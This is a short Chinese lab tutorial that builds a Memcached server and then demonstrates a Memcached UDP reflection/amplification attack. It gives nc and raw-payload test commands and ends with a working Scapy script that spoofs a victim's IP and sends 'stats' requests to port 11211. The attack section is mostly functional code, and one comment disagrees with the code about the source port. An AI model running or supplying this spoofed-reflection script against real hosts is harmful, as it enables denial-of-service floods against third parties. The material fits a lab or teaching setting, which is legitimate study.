### Memcached服务器环境搭建

Memcached反射放大攻击实验

#### 一、服务器搭建

1. 安装

   ~~~
   安装libevent
   tar -zxvf libevent-1.3.tar.gz
   ./configure --prefix=/opt/libevent
   make && make install
   测试
   ls -al /opt/libevent-2.0.21/lib | grep libevent
   安装memcached
   tar -zxvf memcached-1.4.15.tar.gz 
   ./configure  --prefix=/opt/memcached   --with-libevent=/opt/libevent
   make && make install
   ~~~

   

2. 启动

   ~~~
   /opt/memcached/bin/memcached  -d -m 1000 -u root -l 192.168.19.129 -p 11211 -c 256 -P /tmp/memcached.pid
   ~~~

   -d       选项是启动一个守护进程
   -m      是分配给Memcache使用的内存数量，单位是MB，我这里是10MB
   -u       是运行Memcache的用户，我这里是root
   -l        是监听的服务器IP地址，如果有多个地址的话，我这里指定了服务器的IP地址192.168.19.129
   -p       是设置Memcache监听的端口，我这里设置了11211（默认），最好是1024以上的端口
   -c       选项是最大运行的并发连接数，默认是1024，我这里设置了256，按照你服务器的负载量来设定
   -P       是设置保存Memcache的pid文件，我这里是保存在 /tmp/memcached.pid

#### 二、测试

~~~
/opt/memcached/bin/memcached  -d -m 1000 -u root -l 192.168.19.129 -c 256 -P /tmp/memcached.pid
~~~

1. TCP

   ~~~
   echo "stats" | nc -rvv ip port
   ~~~

2. UDP

   ~~~
   python -c 'print"\x01\x00\x00\x00\x00\x01\x00\x00stats\r\n"' | nc -rvvu ip port
   ~~~

#### 三、攻击

脚本攻击

```
#coding=utf-8
from scapy.all import *


def attack(vuln_host,drdos_host,port):
    send_data = b"\x01\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    #下面这句话的意思是伪造受害者向存在memcached漏洞的服务器发起UDP请求，源端口是29284，目标端口是port
    packet = IP(src=vuln_host,dst=drdos_host) / UDP(sport=11211,dport=port) / send_data
    send(packet)


if __name__ == '__main__':
    attack('192.168.19.132','192.168.19.129',11211)
```

#### 参考链接

<https://blog.csdn.net/honyer455/article/details/88018437>